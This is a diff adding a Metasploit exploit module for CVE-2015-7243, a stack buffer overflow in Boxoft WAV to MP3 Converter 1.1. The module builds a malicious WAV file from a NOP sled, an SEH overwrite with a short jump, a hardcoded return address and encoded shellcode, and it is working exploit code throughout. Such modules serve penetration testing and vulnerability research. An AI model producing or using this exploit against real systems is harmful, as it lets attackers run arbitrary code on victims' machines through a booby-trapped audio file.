@@ -1,0 +1,66 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Boxoft WAV to MP3 Converter v1.1 Buffer Overflow",
+      'Description'    => %q{
+       This module exploits a stack buffer overflow in Boxoft WAV to MP3 Converter versions 1.0 and 1.1.
+       By constructing a specially crafted WAV file and attempting to convert it to an MP3 file in the
+       application, a buffer is overwritten, which allows for running shellcode.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Robbie Corley', # EDB POC
+          'Shelby Pace'    # Metasploit Module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2015-7243' ],
+          [ 'EDB', '38035' ]
+        ],
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [
+            'Boxoft WAV to MP3 Converter v1.1',
+            {
+              'Ret' => 0x0040144c # P/P/R from wavtomp3.exe (1.1.0.0)
+            }
+          ]
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "\x00"
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => "Aug 31 2015",
+      'DefaultTarget'  => 0))
+
+    register_options(
+    [
+      OptString.new('FILENAME', [true, 'The malicious file name', 'music.wav'])
+    ])
+  end
+
+  def exploit
+    file_payload = payload.encoded
+
+    buf = make_fast_nops(4132)
+    buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
+    buf << [target.ret].pack("V*")  # seh
+    buf << file_payload
+    # Size isn't very sensitive
+    buf << make_fast_nops(5860)
+
+    file_create(buf)
+  end
+end
